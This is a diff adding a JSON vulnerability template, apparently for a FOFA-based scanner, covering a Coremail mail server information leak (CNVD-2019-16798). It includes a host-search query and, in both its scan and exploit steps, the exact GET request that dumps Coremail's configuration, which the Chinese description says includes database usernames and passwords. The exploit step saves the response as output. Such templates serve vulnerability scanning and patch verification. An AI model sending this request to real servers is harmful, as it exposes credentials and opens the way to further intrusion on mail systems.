@@ -1,0 +1,78 @@
+{
+  "Name": "Coremail Information Leakage (CNVD-2019-16798)",
+  "Description": "Coremail论客邮件系统是目前国内拥有邮箱使用用户最多的邮件系统。Coremail论客邮件系统存在信息泄露漏洞，攻击者可利用该漏洞获取敏感信息。",
+  "Product": "Coremail",
+  "Homepage": "http://www.coremail.cn",
+  "DisclosureDate": "2019-10-06",
+  "Author": "",
+  "FofaQuery": "app=\"Coremail\"",
+  "Level": "2",
+  "Impact": "该漏洞可造成Coremail的配置文件信息泄露，包括数据库连接的用户名、密码等敏感信息。攻击者可能会通过这些敏感信息的收集，从而进一步尝试获取权限和数据的攻击。",
+  "Recommendation": "厂商已提供修复方案，请关注厂商主页更新：http://www.coremail.cn",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "<object name=\"cm_md_db\">",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
+      },
+      "SetVariable": [
+        "output|lastbody"
+      ]
+    }
+  ],
+  "Tags": ["infoleak"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Coremail"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
